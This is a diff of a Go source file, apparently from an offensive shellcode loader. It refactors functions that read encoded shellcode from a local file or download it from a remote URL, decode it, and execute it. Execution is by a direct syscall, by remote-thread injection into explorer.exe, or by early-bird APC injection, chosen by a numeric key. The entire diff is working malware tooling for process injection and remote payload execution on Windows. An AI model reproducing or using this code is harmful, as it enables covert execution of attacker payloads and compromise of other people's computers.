@@ -51,32 +51,6 @@ func original_loader(shellcode []byte) {
 	_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
 }
 
-func OriginalLoader(fp string) {
-	encodeDataByte, err := os.ReadFile(fp)
-	if err != nil {
-		fmt.Printf("读取文件时出错: %v\n", err)
-	}
-	shellcode := Decode(encodeDataByte)
-	original_loader(shellcode)
-}
-
-func Remote_loader(url string) []byte {
-	resp, err := http.Get(url)
-	if err != nil {
-		fmt.Println("error when getting remote connection")
-		return nil
-	}
-	defer resp.Body.Close()
-	encodeDataByte, err := io.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("error when getting remote connection")
-		return nil
-	}
-	shellcode := Decode(encodeDataByte)
-	original_loader(shellcode)
-	return nil
-}
-
 func createProcess(processName string) (windows.Handle, error) {
 	processID, err := getProcessIdByName(processName)
 	if err != nil {
@@ -304,37 +278,73 @@ func allocateAndProtectMemory(shellcode []byte) (uintptr, error) {
 }
 
 // 寻找pid 然后打开进程 申请空间后注入 最后通过新线程执行
-func ThreadShellcodeInject(fp string) error {
-	encodeDataByte, err := os.ReadFile(fp)
-	if err != nil {
-		fmt.Printf("读取文件时出错: %v\n", err)
-	}
-	shellcode := Decode(encodeDataByte)
+func ThreadShellcodeInject(shellcode []byte) error {
 	// 获取notepad.exe进程句柄
-	hProcess, err := getProcessHandleByName("explorer.exe")
+	hProcess, _ := getProcessHandleByName("explorer.exe")
 	defer windows.CloseHandle(hProcess)
 
 	// 在目标进程中分配内存
-	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)
+	lpBaseAddress, _ := allocateMemoryInProcess(hProcess, shellcode)
 	// 向目标进程内存写入shellcode
-	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
+	_ = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
 	// 创建远程线程来执行注入的代码
-	err = createRemoteThreadToExecute(hProcess, lpBaseAddress)
+	_ = createRemoteThreadToExecute(hProcess, lpBaseAddress)
 
 	return nil
 }
 
 // 创建一个RWX的进程，通过apc注入shellcode到线程中
-func EarlybirlInject(fp string) error {
+func EarlybirlInject(shellcode []byte) error {
 
+	addr, _ := allocateAndProtectMemory(shellcode)
+	setupAPC(addr)
+
+	return nil
+}
+
+func OriginalLoader(fp string) {
 	encodeDataByte, err := os.ReadFile(fp)
 	if err != nil {
 		fmt.Printf("读取文件时出错: %v\n", err)
 	}
 	shellcode := Decode(encodeDataByte)
-	
-	addr, _ := allocateAndProtectMemory(shellcode)
-	setupAPC(addr)
+	original_loader(shellcode)
+}
 
+func Local_loader(fp string, key int) error {
+	encodeDataByte, err := os.ReadFile(fp)
+	if err != nil {
+		fmt.Printf("读取文件时出错: %v\n", err)
+	}
+	shellcode := Decode(encodeDataByte)
+	if key == 1 {
+		original_loader(shellcode)
+	} else if key == 2 {
+		ThreadShellcodeInject(shellcode)
+	} else if key == 3 {
+		EarlybirlInject(shellcode)
+	}
+	return nil
+}
+func Remote_loader(url string, key int) error {
+	resp, err := http.Get(url)
+	if err != nil {
+		fmt.Println("error when getting remote connection")
+		return nil
+	}
+	defer resp.Body.Close()
+	encodeDataByte, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("error when getting remote connection")
+		return nil
+	}
+	shellcode := Decode(encodeDataByte)
+	if key == 1 {
+		original_loader(shellcode)
+	} else if key == 2 {
+		ThreadShellcodeInject(shellcode)
+	} else if key == 3 {
+		EarlybirlInject(shellcode)
+	}
 	return nil
 }
